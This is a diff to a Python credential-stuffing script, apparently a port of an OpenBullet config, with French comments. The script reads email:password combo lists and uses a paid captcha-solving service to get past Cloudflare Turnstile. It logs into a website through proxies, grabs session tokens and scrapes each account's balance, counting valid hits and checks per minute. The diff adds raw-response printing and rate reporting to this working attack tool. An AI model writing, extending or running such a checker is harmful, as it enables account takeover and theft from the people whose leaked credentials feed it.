@@ -86,6 +86,9 @@ GET_COOKIE_TEMPLATE = (
 POLL_INTERVAL_SEC = 3.0
 POLL_MAX_ATTEMPTS = 80
 
+# 0 = afficher la SOURCE complète ; sinon tronquer (octets affichés)
+SOURCE_PREVIEW_MAX = 12000
+
 
 def proxy_dict(url: str) -> dict[str, str]:
     return {"http": url, "https": url}
@@ -126,7 +129,7 @@ def read_combos(path: Path) -> list[tuple[str, str]]:
     return out
 
 
-def create_turnstile_task(sess: requests.Session) -> str | None:
+def create_turnstile_task(sess: requests.Session) -> tuple[str | None, str, int]:
     payload: dict[str, Any] = {
         "clientKey": SOLVER_KEY,
         "task": {
@@ -143,19 +146,25 @@ def create_turnstile_task(sess: requests.Session) -> str | None:
         data=json.dumps(payload),
         timeout=120,
     )
+    src = r.text
+    code = r.status_code
     if not r.ok:
-        return None
+        return None, src, code
     try:
         data = r.json()
         tid = data.get("taskId")
-        return str(tid) if tid else None
+        if tid:
+            return str(tid), src, code
+        return None, src, code
     except json.JSONDecodeError:
-        return None
+        return None, src, code
 
 
-def poll_task_result(sess: requests.Session, task_id: str) -> str | None:
+def poll_task_result(sess: requests.Session, task_id: str) -> tuple[str | None, str, int]:
     payload = {"clientKey": SOLVER_KEY, "taskId": task_id}
     body = json.dumps(payload)
+    last_text = ""
+    last_code = 0
     for _ in range(POLL_MAX_ATTEMPTS):
         r = sess.post(
             SOLVER_RESULT,
@@ -166,19 +175,20 @@ def poll_task_result(sess: requests.Session, task_id: str) -> str | None:
             data=body,
             timeout=120,
         )
-        text = r.text
-        if "processing" in text.lower():
+        last_text = r.text
+        last_code = r.status_code
+        if "processing" in last_text.lower():
             time.sleep(POLL_INTERVAL_SEC)
             continue
         try:
             data = r.json()
             val = data.get("value") or data.get("solution", {}).get("token")
             if val:
-                return str(val)
+                return str(val), last_text, last_code
         except json.JSONDecodeError:
             pass
         time.sleep(POLL_INTERVAL_SEC)
-    return None
+    return None, last_text, last_code
 
 
 def login_headers(proxy_url: str) -> dict[str, str]:
@@ -258,7 +268,7 @@ def extract_session_token(text: str) -> str | None:
     return lr_parse(text, '{"token":"', '",' )
 
 
-def get_balance_page(sess: requests.Session, token: str, proxy_url: str) -> str:
+def get_balance_page(sess: requests.Session, token: str, proxy_url: str) -> tuple[str, int]:
     cookie = GET_COOKIE_TEMPLATE.format(token=token)
     headers = {
         "accept": (
@@ -287,7 +297,7 @@ def get_balance_page(sess: requests.Session, token: str, proxy_url: str) -> str:
         "Cookie": cookie,
     }
     r = sess.get(LOCAL_BASE, headers=headers, timeout=120)
-    return r.text
+    return r.text, r.status_code
 
 
 def extract_balance(html: str) -> float | None:
@@ -295,6 +305,37 @@ def extract_balance(html: str) -> float | None:
     if chunk is None:
         return None
     return parse_float_fr(chunk)
+
+
+def print_source(label: str, text: str, status_code: int | None = None) -> None:
+    """Affiche la réponse brute (équivalent <SOURCE> OpenBullet)."""
+    head = f"--- SOURCE {label}"
+    if status_code is not None:
+        head += f" [HTTP {status_code}]"
+    head += " ---"
+    print(head)
+    if SOURCE_PREVIEW_MAX and len(text) > SOURCE_PREVIEW_MAX:
+        print(text[:SOURCE_PREVIEW_MAX])
+        print(f"... [tronqué — {len(text)} octets au total, SOURCE_PREVIEW_MAX={SOURCE_PREVIEW_MAX}]")
+    else:
+        print(text)
+    print("--- fin SOURCE ---\n")
+
+
+def fmt_rates(
+    processed: int,
+    valid: int,
+    invalid: int,
+    custom_low: int,
+    elapsed_min: float,
+) -> str:
+    cpm_total = processed / elapsed_min
+    cpm_valid = valid / elapsed_min
+    cpm_invalid = invalid / elapsed_min
+    return (
+        f"valid={valid} invalid={invalid} custom<{30}={custom_low} "
+        f"CPM={cpm_total:.1f} CPM_valid={cpm_valid:.1f} CPM_invalid={cpm_invalid:.1f}"
+    )
 
 
 def main() -> int:
@@ -328,35 +369,32 @@ def main() -> int:
 
     for email, password in combos:
         processed += 1
-        elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
-        cpm = processed / elapsed_min
 
-        task_id = create_turnstile_task(solver_sess)
+        task_id, src_create, code_create = create_turnstile_task(solver_sess)
         if not task_id:
             invalid += 1
-            print(
-                f"[{processed}] INVALID (solver createTask) | "
-                f"valid={valid} invalid={invalid} custom<{30}={custom_low} CPM={cpm:.1f}"
-            )
+            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
+            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
+            print(f"[{processed}] INVALID (solver createTask) | {rates}")
+            print_source("solver createTask", src_create, code_create)
             continue
 
-        tk = poll_task_result(solver_sess, task_id)
+        tk, src_poll, code_poll = poll_task_result(solver_sess, task_id)
         if not tk:
             invalid += 1
-            print(
-                f"[{processed}] INVALID (solver timeout) | "
-                f"valid={valid} invalid={invalid} custom<{30}={custom_low} CPM={cpm:.1f}"
-            )
+            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
+            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
+            print(f"[{processed}] INVALID (solver timeout / pas de token) | {rates}")
+            print_source("solver getTaskResult (dernière réponse)", src_poll, code_poll)
             continue
 
         try:
             login_resp = post_login(local_sess, email, password, tk, proxy_url)
         except requests.RequestException as e:
             invalid += 1
-            print(
-                f"[{processed}] INVALID (login req {e!s}) | "
-                f"valid={valid} invalid={invalid} custom<{30}={custom_low} CPM={cpm:.1f}"
-            )
+            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
+            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
+            print(f"[{processed}] INVALID (login req {e!s}) | {rates}")
             continue
 
         body = login_resp.text
@@ -364,48 +402,56 @@ def main() -> int:
 
         if not ok:
             invalid += 1
-            print(
-                f"[{processed}] INVALID {email!s} | "
-                f"valid={valid} invalid={invalid} custom<{30}={custom_low} CPM={cpm:.1f}"
-            )
+            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
+            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
+            print(f"[{processed}] INVALID {email!s} | {rates}")
+            print_source("login POST", body, login_resp.status_code)
             continue
 
         token = extract_session_token(body)
         if not token:
             invalid += 1
+            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
+            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
+            print(f"[{processed}] INVALID (pas de token) {email!s} | {rates}")
+            print_source("login POST", body, login_resp.status_code)
+            continue
+
+        print_source("login POST", body, login_resp.status_code)
+
+        try:
+            html, bal_code = get_balance_page(local_sess, token, proxy_url)
+        except requests.RequestException as e:
+            valid += 1
+            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
+            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
             print(
-                f"[{processed}] INVALID (pas de token) {email!s} | "
-                f"valid={valid} invalid={invalid} custom<{30}={custom_low} CPM={cpm:.1f}"
+                f"[{processed}] VALID {email!s} (solde: erreur requête {e!s}) | {rates}"
             )
             continue
 
-        try:
-            html = get_balance_page(local_sess, token, proxy_url)
-        except requests.RequestException:
-            valid += 1
-            print(
-                f"[{processed}] VALID {email!s} (solde: erreur requête) | "
-                f"valid={valid} invalid={invalid} custom<{30}={custom_low} CPM={cpm:.1f}"
-            )
-            continue
+        print_source("GET compte.htm (solde)", html, bal_code)
 
         solde = extract_balance(html)
         if solde is not None and solde < 30:
             custom_low += 1
 
         valid += 1
+        elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
+        rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
         solde_s = f"{solde}" if solde is not None else "?"
         flag = " [CUSTOM solde<30]" if solde is not None and solde < 30 else ""
-        print(
-            f"[{processed}] VALID {email!s} solde={solde_s}{flag} | "
-            f"valid={valid} invalid={invalid} custom<{30}={custom_low} CPM={cpm:.1f}"
-        )
+        print(f"[{processed}] VALID {email!s} solde={solde_s}{flag} | {rates}")
 
     elapsed = time.monotonic() - t0
-    cpm_final = processed / max(elapsed / 60.0, 1e-6)
+    em = max(elapsed / 60.0, 1e-6)
+    cpm_total = processed / em
+    cpm_valid = valid / em
+    cpm_invalid = invalid / em
     print(
-        f"\nTerminé en {elapsed:.1f}s — "
-        f"valid={valid} invalid={invalid} custom_solde<30={custom_low} CPM≈{cpm_final:.1f}"
+        f"\nTerminé en {elapsed:.1f}s — valid={valid} invalid={invalid} "
+        f"custom_solde<30={custom_low} "
+        f"CPM≈{cpm_total:.1f} CPM_valid≈{cpm_valid:.1f} CPM_invalid≈{cpm_invalid:.1f}"
     )
     return 0
 
